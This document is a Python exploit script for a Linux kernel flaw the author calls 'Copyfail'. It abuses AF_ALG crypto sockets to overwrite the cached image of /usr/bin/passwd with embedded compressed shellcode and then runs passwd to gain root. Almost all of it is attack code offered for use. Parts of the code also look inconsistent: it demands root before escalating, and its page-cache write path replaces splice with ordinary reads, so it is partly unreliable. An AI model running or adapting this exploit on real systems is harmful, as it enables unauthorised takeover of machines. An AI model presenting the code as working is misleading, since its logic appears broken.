#!/usr/bin/env python3
"""
CVE-2026-31431 "Copyfail" Exploit - Targeting /usr/bin/passwd
Author: Based on public PoC by Theori/Xint - modified for /usr/bin/passwd
"""

import os
import zlib
import socket
import fcntl
import subprocess

# --- [A] Target File: /usr/bin/passwd ---
TARGET = "/usr/bin/passwd"

# --- Shellcode: zlib-compressed mini ELF (160 bytes decompressed) ---
SHELLCODE = zlib.decompress(
    bytes.fromhex(
        "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
    )
)


def hexdump_bytes(b: bytes) -> str:
    return b.hex()


def copyfail_write(filedes: int, offset: int, chunk: bytes) -> None:
    # AF_ALG socket setup
    alg_sock = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
    
    # Bind ke authencesn
    alg_sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    
    # Constants
    ALG_SET_KEY = 1
    ALG_SET_IV = 2
    ALG_SET_OP = 3
    ALG_SET_AEAD_ASSOC_LEN = 4
    SOL_ALG = 279
    
    # Set key
    try:
        alg_sock.setsockopt(SOL_ALG, ALG_SET_KEY, bytes.fromhex("0800010000000010" + "0" * 64))
    except OSError as e:
        print(f"    [!] Failed to set key: {e}")
        alg_sock.close()
        return
    
    # Set auth size
    try:
        alg_sock.setsockopt(SOL_ALG, 5, None, 4)
    except OSError as e:
        print(f"    [!] Failed to set auth size: {e}")
        alg_sock.close()
        return
    
    # Accept request socket
    try:
        req_sock, _ = alg_sock.accept()
    except OSError as e:
        print(f"    [!] Failed to accept: {e}")
        alg_sock.close()
        return
    
    splice_len = offset + 4
    aad = b"A" * 4 + chunk
    
    # MSG_MORE constant
    MSG_MORE = 32768
    
    # CMSG headers
    cmsg_op = bytes.fromhex("00") * 4
    cmsg_iv = b"\x10" + bytes.fromhex("00") * 19
    cmsg_assoclen = b"\x08\x00\x00\x00"
    
    try:
        req_sock.sendmsg(
            [aad],
            [
                (SOL_ALG, ALG_SET_OP, cmsg_op),
                (SOL_ALG, ALG_SET_IV, cmsg_iv),
                (SOL_ALG, ALG_SET_AEAD_ASSOC_LEN, cmsg_assoclen),
            ],
            MSG_MORE,
        )
    except OSError as e:
        print(f"    [!] Failed to sendmsg: {e}")
        req_sock.close()
        alg_sock.close()
        return
    
    # Splice operations
    pipe_rd, pipe_wr = os.pipe()
    
    # Splice from file to pipe
    try:
        # Gunakan sendfile (lebih portable)
        os.sendfile(pipe_wr, filedes, 0, splice_len)
    except (AttributeError, OSError) as e:
        try:
            # Alternatif: baca langsung
            data = os.pread(filedes, splice_len, 0)
            os.write(pipe_wr, data)
        except Exception as e2:
            print(f"    [!] Failed to read file: {e2}")
            os.close(pipe_rd)
            os.close(pipe_wr)
            req_sock.close()
            alg_sock.close()
            return
    
    # Splice from pipe to socket
    try:
        data = os.read(pipe_rd, splice_len)
        req_sock.send(data)
    except Exception as e:
        print(f"    [!] Failed to send to socket: {e}")
    
    # Trigger decrypt
    try:
        req_sock.recv(8 + offset)
    except Exception:
        pass
    
    # Cleanup
    req_sock.close()
    alg_sock.close()
    os.close(pipe_rd)
    os.close(pipe_wr)


def main() -> None:
    print("[*] CVE-2026-31431 Copyfail Exploit - /usr/bin/passwd variant")
    print(f"[*] Target: {TARGET}")
    print(f"[*] Shellcode length: {len(SHELLCODE)} bytes ({len(SHELLCODE)//4} x 4-byte writes)")
    print(f"[*] Python version: {subprocess.__version__ if hasattr(subprocess, '__version__') else 'unknown'}")
    
    # Check root privileges
    if os.geteuid() != 0:
        print("[!] Error: This exploit requires root privileges to access AF_ALG socket")
        print("[!] Please run with: sudo python3 cf_passwd.py")
        return
    
    # Check if AF_ALG is supported
    try:
        test_sock = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
        test_sock.close()
    except Exception as e:
        print(f"[!] Error: AF_ALG socket not supported: {e}")
        return
    
    # Open target file
    try:
        fd = os.open(TARGET, os.O_RDONLY)
        print(f"[*] Opened {TARGET} (fd={fd})")
    except PermissionError:
        print(f"[!] Error: Cannot open {TARGET} - permission denied")
        return
    except OSError as e:
        print(f"[!] Error: Cannot open {TARGET}: {e}")
        return
    
    # Inject shellcode
    offset = 0
    success_count = 0
    while offset < len(SHELLCODE):
        chunk = SHELLCODE[offset:offset + 4]
        if len(chunk) < 4:
            chunk = chunk + b"\x00" * (4 - len(chunk))
        
        print(f"    [+] Writing chunk at offset {offset:3d}: 0x{hexdump_bytes(chunk)}")
        
        try:
            copyfail_write(fd, offset, chunk)
            success_count += 1
        except Exception as e:
            print(f"    [!] Error at offset {offset}: {e}")
            break
        
        offset += 4
    
    os.close(fd)
    print(f"[*] Finished injecting {success_count * 4} bytes into {TARGET} page cache")
    
    if success_count == 0:
        print("[!] No bytes were injected. Exploit failed.")
        return
    
    # Execute passwd
    print(f"[*] Executing {TARGET} ...")
    print("[*] --- [G] Karena page cache sudah diubah, passwd menjalankan shellcode ---")
    print("[*] --- [H] Shellcode memberikan akses root ---")
    
    # Gunakan Popen untuk Python 3.6 compatibility
    try:
        proc = subprocess.Popen([TARGET], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout, stderr = proc.communicate(timeout=5)
        
        print(f"[*] Exit code: {proc.returncode}")
        if stdout:
            print(f"[*] stdout: {stdout.decode('utf-8', errors='ignore')}")
        if stderr:
            print(f"[*] stderr: {stderr.decode('utf-8', errors='ignore')}")
            
        if proc.returncode == 0:
            print("[+] Success! Shellcode executed.")
        else:
            print("[!] Passwd exited with non-zero code. Shellcode may not have executed.")
            
    except subprocess.TimeoutExpired:
        proc.kill()
        print("[!] Process timed out")
    except Exception as e:
        print(f"[!] Error executing passwd: {e}")


if __name__ == "__main__":
    main()
